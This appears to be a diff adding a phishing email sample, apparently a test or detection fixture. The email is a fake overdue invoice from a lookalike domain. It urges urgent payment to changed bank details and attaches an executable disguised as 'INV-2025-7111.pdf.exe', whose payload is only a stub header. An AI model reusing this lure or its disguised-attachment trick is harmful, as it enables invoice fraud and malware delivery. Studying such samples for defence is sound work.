@@ -1,0 +1,72 @@
+From: "Kestrel Supplies Ltd Accounts" <billing@docu-sign-secure.xyz>
+To: Anna Rao <anna.rao@vertexlogistics.in>
+Subject: Invoice attached: INV-2025-7111 ($9,119,000)
+Date: Fri, 08 May 2026 17:03:00 +0000
+Message-ID: <178772093984.6.6698349072591184434@docu-sign-secure.xyz>
+Return-Path: <bounce-9427@docu-sign-secure.xyz>
+MIME-Version: 1.0
+Received: from mx1.mail-relay.example (mx1.mail-relay.example [192.0.2.10]) by
+ mx.vertexlogistics.in (Postfix) with ESMTPS id 46EA79A6282A for
+ <recipient@vertexlogistics.in>; Fri, 08 May 2026 17:03:00 +0000
+Received: from mail.gateway.example (mail.gateway.example [203.0.113.5]) by
+ mx1.mail-relay.example (Postfix) with ESMTPS id 9A83BB13F7AF; Fri, 08 May
+ 2026 17:00:26 +0000
+Received: from compute-04.cloudprovider.example
+ (compute-04.cloudprovider.example [198.51.100.150]) by mail.gateway.example
+ (Postfix) with ESMTPS id 36A156D1A3BE; Fri, 08 May 2026 16:54:33 +0000
+Received: from smtp-out-3.example (smtp-out-3.example [192.0.2.44]) by
+ compute-04.cloudprovider.example (Postfix) with ESMTPS id 332D04931464; Fri,
+ 08 May 2026 16:51:18 +0000
+Received-SPF: fail (mailfrom) identity=mailfrom; client-ip=192.0.2.10;
+ envelope-from=<bounce@docu-sign-secure.xyz>;
+Authentication-Results: mx.docu-sign-secure.xyz; spf=fail
+ smtp.mailfrom=docu-sign-secure.xyz; dkim=none header.d=docu-sign-secure.xyz;
+ dmarc=fail (p=reject) header.from=docu-sign-secure.xyz
+Content-Type: multipart/mixed; boundary="===============3142523041029271210=="
+
+--===============3142523041029271210==
+Content-Type: multipart/alternative;
+ boundary="===============5507518640092714488=="
+
+--===============5507518640092714488==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Hello Anna,
+
+Please find attached invoice INV-2025-7111 for $9,119,000, now overdue. Kindly
+review the attached statement and process this payment immediately to avoid
+service interruption.
+
+If the bank details have changed since your last remittance, use the updated
+account information in the attachment.
+
+Regards,
+Rahul Ellis
+Accounts Receivable, Kestrel Supplies Ltd
+
+--===============5507518640092714488==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Hello Anna,</p><p>Please find attached invoice INV-2025-7111 f=
+or $9,119,000, now overdue. Kindly review the attached statement and process =
+this payment immediately to avoid service interruption.</p><p>If the bank det=
+ails have changed since your last remittance, use the updated account informa=
+tion in the attachment.</p><p>Regards, Rahul Ellis Accounts Receivable, Kestr=
+el Supplies Ltd</p></body></html>
+
+--===============5507518640092714488==--
+
+--===============3142523041029271210==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="INV-2025-7111.pdf.exe"
+MIME-Version: 1.0
+
+TVqQAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRo
+aXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl
+
+--===============3142523041029271210==--
